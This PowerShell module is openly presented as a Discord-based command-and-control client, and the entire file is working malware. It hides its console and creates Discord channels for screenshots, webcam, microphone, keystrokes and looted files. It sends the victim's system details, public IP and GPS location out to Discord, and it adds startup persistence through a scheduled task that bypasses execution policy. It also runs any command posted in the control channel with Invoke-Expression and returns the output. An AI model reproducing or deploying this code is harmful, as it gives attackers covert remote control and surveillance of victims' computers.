# DiscordC2Client.psm1
# A modern, modular PowerShell module for a Discord-based C2 client
# Version: 2.0.0
# Date: July 31, 2025

# Configuration
$Config = @{
    Token = ConvertTo-SecureString "$tk" -AsPlainText -Force
    HideConsole = $true
    SpawnChannels = $true
    InfoOnConnect = $true
    DefaultStart = $true
    ParentUrl = "https://is.gd/bwdcc2"
    Version = "2.0.0"
    LogPath = "$env:Temp\c2.log"
}

# Initialize HttpClient for Discord API
$Global:HttpClient = New-Object System.Net.Http.HttpClient
$Global:HttpClient.DefaultRequestHeaders.Authorization = New-Object System.Net.Http.Headers.AuthenticationHeaderValue("Bot", (ConvertFrom-SecureString -SecureString $Config.Token))
$Global:HttpClient.DefaultRequestHeaders.Add("User-Agent", "DiscordC2Client/2.0.0")

# Logging Function
Function Write-C2Log {
    param([string]$Message, [string]$Level = "INFO")
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$Timestamp [$Level] $Message" | Out-File -FilePath $Config.LogPath -Append -Encoding UTF8
}

# Secure Token Retrieval
Function Get-BotToken {
    try {
        $Token = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Config.Token))
        Write-C2Log -Message "Token retrieved successfully"
        return $Token
    }
    catch {
        Write-C2Log -Message "Failed to retrieve token: $_" -Level "ERROR"
        throw
    }
}

# Download FFmpeg
Function Get-FFmpeg {
    try {
        Write-C2Log -Message "Downloading FFmpeg"
        $Path = "$env:Temp\ffmpeg.exe"
        if (-not (Test-Path $Path)) {
            $ApiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
            $Response = Invoke-RestMethod -Uri $ApiUrl -Headers @{ "User-Agent" = "PowerShell" }
            $Asset = $Response.assets | Where-Object { $_.name -like "*essentials_build.zip" }
            $ZipUrl = $Asset.browser_download_url
            $ZipPath = "$env:Temp\ffmpeg.zip"
            $ExtractPath = "$env:Temp\ffmpeg"
            Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath
            Expand-Archive -Path $ZipPath -DestinationPath $ExtractPath -Force
            Move-Item -Path "$ExtractPath\bin\ffmpeg.exe" -Destination $Path -Force
            Remove-Item -Path $ZipPath, $ExtractPath -Recurse -Force
            Write-C2Log -Message "FFmpeg downloaded and extracted"
        }
        Send-DiscordMessage -ChannelId $Global:SessionID -Content ":hourglass: FFmpeg installed"
    }
    catch {
        Write-C2Log -Message "FFmpeg download failed: $_" -Level "ERROR"
        Send-DiscordMessage -ChannelId $Global:SessionID -Content ":warning: FFmpeg download failed"
    }
}

# Create Discord Category
Function New-DiscordCategory {
    try {
        Write-C2Log -Message "Creating Discord category"
        $GuildId = Get-DiscordGuildId
        $Uri = "https://discord.com/api/v10/guilds/$GuildId/channels"
        $Body = @{
            name = $env:COMPUTERNAME
            type = 4
        } | ConvertTo-Json
        $Response = $Global:HttpClient.PostAsync($Uri, (New-Object System.Net.Http.StringContent($Body, [System.Text.Encoding]::UTF8, "application/json"))).Result
        $ResponseObj = $Response.Content.ReadAsStringAsync().Result | ConvertFrom-Json
        $Global:CategoryID = $ResponseObj.id
        Write-C2Log -Message "Category created: $Global:CategoryID"
    }
    catch {
        Write-C2Log -Message "Category creation failed: $_" -Level "ERROR"
        throw
    }
}

# Create Discord Channel
Function New-DiscordChannel {
    param([string]$Name)
    try {
        Write-C2Log -Message "Creating channel: $Name"
        $GuildId = Get-DiscordGuildId
        $Uri = "https://discord.com/api/v10/guilds/$GuildId/channels"
        $Body = @{
            name = $Name
            type = 0
            parent_id = $Global:CategoryID
        } | ConvertTo-Json
        $Response = $Global:HttpClient.PostAsync($Uri, (New-Object System.Net.Http.StringContent($Body, [System.Text.Encoding]::UTF8, "application/json"))).Result
        $ResponseObj = $Response.Content.ReadAsStringAsync().Result | ConvertFrom-Json
        return $ResponseObj.id
    }
    catch {
        Write-C2Log -Message "Channel creation failed for $Name: $_" -Level "ERROR"
        throw
    }
}

# Send Discord Message
Function Send-DiscordMessage {
    param([string]$ChannelId, [string]$Content, [hashtable]$Embed)
    try {
        $Uri = "https://discord.com/api/v10/channels/$ChannelId/messages"
        $Body = if ($Embed) {
            @{ embeds = @($Embed) } | ConvertTo-Json -Depth 10
        } else {
            @{ content = $Content } | ConvertTo-Json
        }
        $Response = $Global:HttpClient.PostAsync($Uri, (New-Object System.Net.Http.StringContent($Body, [System.Text.Encoding]::UTF8, "application/json"))).Result
        Write-C2Log -Message "Message sent to channel $ChannelId"
    }
    catch {
        Write-C2Log -Message "Message send failed: $_" -Level "ERROR"
    }
}

# Send Discord File
Function Send-DiscordFile {
    param([string]$ChannelId, [string]$FilePath)
    try {
        if (Test-Path $FilePath) {
            $Uri = "https://discord.com/api/v10/channels/$ChannelId/messages"
            $MultipartContent = New-Object System.Net.Http.MultipartFormDataContent
            $FileStream = [System.IO.File]::OpenRead($FilePath)
            $FileContent = New-Object System.Net.Http.StreamContent($FileStream)
            $MultipartContent.Add($FileContent, "file", (Split-Path $FilePath -Leaf))
            $Response = $Global:HttpClient.PostAsync($Uri, $MultipartContent).Result
            $FileStream.Close()
            Write-C2Log -Message "File sent: $FilePath"
        } else {
            Write-C2Log -Message "File not found: $FilePath" -Level "ERROR"
        }
    }
    catch {
        Write-C2Log -Message "File send failed: $_" -Level "ERROR"
    }
}

# Get System Info
Function Get-SystemInfo {
    try {
        Write-C2Log -Message "Gathering system info"
        $SystemInfo = Get-CimInstance Win32_OperatingSystem
        $ProcessorInfo = Get-CimInstance Win32_Processor
        $VideoCardInfo = Get-CimInstance Win32_VideoController
        $RamInfo = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB
        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $GeoWatcher.Start()
        Start-Sleep -Milliseconds 100
        $GPS = if ($GeoWatcher.Permission -eq 'Denied') { "Location Services Off" } else {
            $Loc = $GeoWatcher.Position.Location
            "LAT = $($Loc.Latitude) LONG = $($Loc.Longitude)"
        }
        $IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        $Embed = @{
            title = "$env:COMPUTERNAME | System Info"
            description = @"
**User Info**
- User: $env:USERNAME
- Admin: $IsAdmin
- Language: $((Get-WinSystemLocale).Name)

**OS Info**
- OS: $($SystemInfo.Caption) - $($SystemInfo.BuildNumber)
- Arch: $($SystemInfo.OSArchitecture)

**Hardware Info**
- CPU: $($ProcessorInfo.Name)
- GPU: $($VideoCardInfo.Name)
- RAM: $RamInfo GB
- Screen: $($Screen.Width) x $($Screen.Height)

**Network Info**
- Public IP: $((Invoke-WebRequest -Uri "ipinfo.io/ip" -UseBasicParsing).Content)
- Location: $GPS
"@
            color = 65280
        }
        Send-DiscordMessage -ChannelId $Global:SessionID -Embed $Embed
        Write-C2Log -Message "System info sent"
    }
    catch {
        Write-C2Log -Message "System info collection failed: $_" -Level "ERROR"
    }
}

# Hide Console
Function Hide-Console {
    try {
        $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
        $Type = Add-Type -MemberDefinition $Async -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
        $Hwnd = (Get-Process -PID $PID).MainWindowHandle
        if ($Hwnd -ne [System.IntPtr]::Zero) {
            $Type::ShowWindowAsync($Hwnd, 0)
        }
        Write-C2Log -Message "Console hidden"
    }
    catch {
        Write-C2Log -Message "Console hiding failed: $_" -Level "ERROR"
    }
}

# Add Persistence
Function Add-Persistence {
    try {
        Write-C2Log -Message "Adding persistence"
        $TaskName = "DiscordC2Client"
        $ScriptPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
        $CurrentScript = $MyInvocation.MyCommand.Definition
        Copy-Item -Path $CurrentScript -Destination $ScriptPath -Force
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -Exec Bypass -File `"$ScriptPath`""
        $Trigger = New-ScheduledTaskTrigger -AtStartup
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Force
        Send-DiscordMessage -ChannelId $Global:SessionID -Content ":white_check_mark: Persistence added"
        Write-C2Log -Message "Persistence added via scheduled task"
    }
    catch {
        Write-C2Log -Message "Persistence setup failed: $_" -Level "ERROR"
    }
}

# Main Loop
Function Start-C2Client {
    try {
        Write-C2Log -Message "Starting C2 client"
        if ($Config.HideConsole) { Hide-Console }
        if ($Config.SpawnChannels) {
            New-DiscordCategory
            $Global:SessionID = New-DiscordChannel -Name "session-control"
            $Global:ScreenshotID = New-DiscordChannel -Name "screenshots"
            $Global:WebcamID = New-DiscordChannel -Name "webcam"
            $Global:MicrophoneID = New-DiscordChannel -Name "microphone"
            $Global:KeyID = New-DiscordChannel -Name "keycapture"
            $Global:LootID = New-DiscordChannel -Name "loot-files"
            $Global:PowershellID = New-DiscordChannel -Name "powershell"
        }
        Get-FFmpeg
        if ($Config.InfoOnConnect) { Get-SystemInfo }
        if ($Config.DefaultStart) { Add-Persistence }
        Send-DiscordMessage -ChannelId $Global:SessionID -Content ":white_check_mark: $env:COMPUTERNAME Setup Complete!"
        Write-C2Log -Message "C2 client setup complete"

        # Main command loop
        $LastMessageId = $null
        while ($true) {
            $Messages = $Global:HttpClient.GetAsync("https://discord.com/api/v10/channels/$Global:SessionID/messages").Result.Content.ReadAsStringAsync().Result | ConvertFrom-Json
            $MostRecent = $Messages[0]
            if ($MostRecent.author.id -ne (Get-BotUserId) -and $MostRecent.timestamp -ne $LastMessageId) {
                $LastMessageId = $MostRecent.timestamp
                $Command = $MostRecent.content
                Write-C2Log -Message "Received command: $Command"
                switch ($Command) {
                    "systeminfo" { Get-SystemInfo }
                    "close" {
                        Send-DiscordMessage -ChannelId $Global:SessionID -Content ":no_entry: $env:COMPUTERNAME Session Closed"
                        exit
                    }
                    default {
                        try {
                            $Output = Invoke-Expression $Command | Out-String
                            Send-DiscordMessage -ChannelId $Global:SessionID -Content "``````$Output``````"
                        }
                        catch {
                            Send-DiscordMessage -ChannelId $Global:SessionID -Content ":warning: Command failed: $_"
                        }
                    }
                }
            }
            Start-Sleep -Seconds 3
        }
    }
    catch {
        Write-C2Log -Message "C2 client failed: $_" -Level "ERROR"
        Send-DiscordMessage -ChannelId $Global:SessionID -Content ":warning: C2 client encountered an error"
    }
}

# Helper: Get Guild ID
Function Get-DiscordGuildId {
    try {
        $Response = $Global:HttpClient.GetAsync("https://discord.com/api/v10/users/@me/guilds").Result
        $Guilds = $Response.Content.ReadAsStringAsync().Result | ConvertFrom-Json
        return $Guilds[0].id
    }
    catch {
        Write-C2Log -Message "Guild ID retrieval failed: $_" -Level "ERROR"
        throw
    }
}

# Start the client
Start-C2Client
